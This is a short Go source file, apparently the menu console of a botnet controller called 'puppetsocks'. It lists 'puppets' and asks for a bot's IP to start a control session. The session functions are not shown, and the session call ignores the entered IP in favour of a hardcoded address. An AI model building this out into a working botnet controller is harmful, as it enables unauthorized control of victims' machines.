package main 
import (

	"github.com/olekukonko/tablewriter"
	"github.com/CrowdSurge/banner"
	"os"
	"bufio"
	"strings"
	"fmt"
)

func TermEmu()  { 
	reader := bufio.NewReader(os.Stdin)
	colorRed := "\033[31m"
	for{
		fmt.Println("\n")
		fmt.Print(string(colorRed), "[~]-> ")
		text, _ := reader.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		if strings.Compare("1", text) == 0 {
			fmt.Println("listing puppets...")
		}else if strings.Compare("2", text) == 0 {
			fmt.Println("fetching...")
			ListBots()
			fmt.Print(string(colorRed), "enter the ip address of the bot you want to control: ")
			input, _ := reader.ReadString('\n')
			input = strings.Replace(input, "\n", "", -1)
			fmt.Println(string(colorRed), "initializing session....")
			Interact("192.168.1.1")
		}
	}

}

func PrintBanner() { 

	banner.Print("puppetsocks")
	data := [][]string {
		[]string{"1", "Lists puppets", "list"},
		[]string{"2", "Control a puppet", "control"},
	}

	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"No.", "Description", "Command"})
	for _, v := range data { 
		table.Append(v)
	}

	table.Render()
	TermEmu()

}
